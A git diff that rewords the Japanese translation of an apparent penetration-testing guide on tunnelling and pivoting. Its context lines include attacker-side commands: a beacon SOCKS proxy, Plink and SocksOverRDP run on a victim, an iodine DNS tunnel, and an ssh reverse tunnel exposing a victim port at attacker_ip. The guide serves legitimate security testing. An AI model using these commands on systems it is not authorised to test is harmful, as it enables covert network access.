@@ -5,7 +5,7 @@
 ## Nmapのヒント
 
 > [!WARNING]
-> **ICMP**および**SYN**スキャンはソックスプロキシを通してトンネリングできないため、**pingディスカバリーを無効にする**必要があります（`-Pn`）および**TCPスキャン**（`-sT`）を指定する必要があります。
+> **ICMP**および**SYN**スキャンはソックスプロキシを通じてトンネリングできないため、**pingディスカバリーを無効にする**必要があります（`-Pn`）および**TCPスキャン**（`-sT`）を指定する必要があります。
 
 ## **Bash**
 
@@ -89,12 +89,12 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **セキュリティ – テラピン攻撃 (CVE-2023-48795)**
-> 2023年のテラピンダウングレード攻撃により、マンインザミドルが初期SSHハンドシェイクを改ざんし、**任意の転送チャネル**（ `-L`, `-R`, `-D` ）にデータを注入することができます。クライアントとサーバーの両方がパッチ適用されていることを確認してください（**OpenSSH ≥ 9.6/LibreSSH 6.7**）または、SSHトンネルに依存する前に、`sshd_config`/`ssh_config`で脆弱な`chacha20-poly1305@openssh.com`および`*-etm@openssh.com`アルゴリズムを明示的に無効にしてください。
+> 2023年のテラピンダウングレード攻撃により、マンインザミドルが初期SSHハンドシェイクを改ざんし、**任意の転送チャネル**（ `-L`, `-R`, `-D` ）にデータを注入することができます。クライアントとサーバーの両方がパッチ適用されていることを確認してください（**OpenSSH ≥ 9.6/LibreSSH 6.7**）またはSSHトンネルに依存する前に、脆弱な `chacha20-poly1305@openssh.com` および `*-etm@openssh.com` アルゴリズムを `sshd_config`/`ssh_config` で明示的に無効にしてください。
 
 ## SSHUTTLE
 
-**ssh**を介して**サブネットワーク**への**トラフィック**をホストを通じて**トンネル**できます。\
-例えば、10.10.10.0/24へのすべてのトラフィックを転送することができます。
+**ssh** を介してホストを通じて **サブネットワーク** への **トラフィック** をすべて **トンネル** できます。\
+例えば、10.10.10.0/24 へのすべてのトラフィックを転送すること。
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -138,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKSプロキシ
 
-すべてのインターフェースでリッスンしているteamserverでポートを開き、**ビコーンを通じてトラフィックをルーティングする**ことができます。
+チームサーバーでポートを開き、**ビコーンを通じてトラフィックをルーティングする**ために使用できるすべてのインターフェースでリッスンします。
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -324,7 +324,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-これはコンソール版のPuTTYのようなもので（オプションはsshクライアントに非常に似ています）。
+これはコンソール版のPuTTYのようなもので（オプションはsshクライアントに非常に似ています）、
 
 このバイナリは被害者のマシンで実行され、sshクライアントであるため、リバース接続を確立するためにsshサービスとポートを開く必要があります。次に、ローカルでアクセス可能なポートを自分のマシンのポートに転送するには：
 ```bash
@@ -358,7 +358,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-今、私たちは **`mstsc.exe`** を使用して **RDP** 経由で **victim** に **接続** でき、**SocksOverRDP プラグインが有効である** という **プロンプト** が表示され、**127.0.0.1:1080** で **リッスン** することになります。
+今、私たちは **`mstsc.exe`** を使用して **RDP** 経由で **victim** に **接続** できます。**SocksOverRDP プラグインが有効になっている** という **プロンプト** が表示され、**127.0.0.1:1080** で **リッスン** します。
 
 **RDP** 経由で **接続** し、victim マシンに `SocksOverRDP-Server.exe` バイナリをアップロードして実行します:
 ```
@@ -401,7 +401,7 @@ Tunnel 2222:<attackers_machine>:443
 
 ## YARP
 
-Microsoftによって作成されたリバースプロキシです。こちらで見つけることができます: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
+Microsoftによって作成されたリバースプロキシです。ここで見つけることができます: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
 ## DNSトンネリング
 
@@ -415,7 +415,7 @@ attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-トンネルは非常に遅くなります。このトンネルを通じて圧縮されたSSH接続を作成するには、次のようにします:
+トンネルは非常に遅くなります。このトンネルを通じて圧縮されたSSH接続を作成するには、次のコマンドを使用します:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -446,7 +446,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### プロキシチェインのDNSを変更する
 
-Proxychainsは`gethostbyname` libcコールをインターセプトし、TCP DNSリクエストをソックスプロキシを通じてトンネリングします。**デフォルト**では、proxychainsが使用する**DNS**サーバーは**4.2.2.2**（ハードコーディングされています）。これを変更するには、ファイルを編集します: _/usr/lib/proxychains3/proxyresolv_ そしてIPを変更します。**Windows環境**にいる場合は、**ドメインコントローラー**のIPを設定できます。
+Proxychainsは`gethostbyname` libcコールをインターセプトし、TCP DNSリクエストをソックスプロキシを通してトンネリングします。**デフォルト**では、proxychainsが使用する**DNS**サーバーは**4.2.2.2**（ハードコーディングされています）。これを変更するには、ファイルを編集します: _/usr/lib/proxychains3/proxyresolv_ そしてIPを変更します。**Windows環境**にいる場合は、**ドメインコントローラー**のIPを設定できます。
 
 ## Goでのトンネル
 
@@ -517,7 +517,7 @@ _必要に応じて、認証とTLSを追加することも可能です。_
 ```
 #### HTTPコールのスニッフィング
 
-_XSS、SSRF、SSTIに役立ちます..._\
+_XSS、SSRF、SSTI ... に役立ちます。_\
 stdoutから直接、またはHTTPインターフェース [http://127.0.0.1:4040](http://127.0.0.1:4000) で。
 
 #### 内部HTTPサービスのトンネリング
@@ -532,7 +532,7 @@ stdoutから直接、またはHTTPインターフェース [http://127.0.0.1:404
 3つのトンネルを開きます：
 
 - 2つのTCP
-- /tmp/httpbin/ からの静的ファイルの公開を伴う1つのHTTP
+- 1つのHTTP、/tmp/httpbin/ からの静的ファイルの公開
 ```yaml
 tunnels:
 mytcp:
@@ -608,7 +608,7 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-上記のコマンドは、被害者のポート **8080** を **attacker_ip:9000** として公開し、追加のツールを展開することなく、理想的なリビングオフザランドピボットを実現します。
+上記のコマンドは、被害者のポート **8080** を **attacker_ip:9000** として公開し、追加のツールを展開することなく実行します - ライビングオフザランドのピボットに最適です。
 
 ## チェックすべき他のツール
 
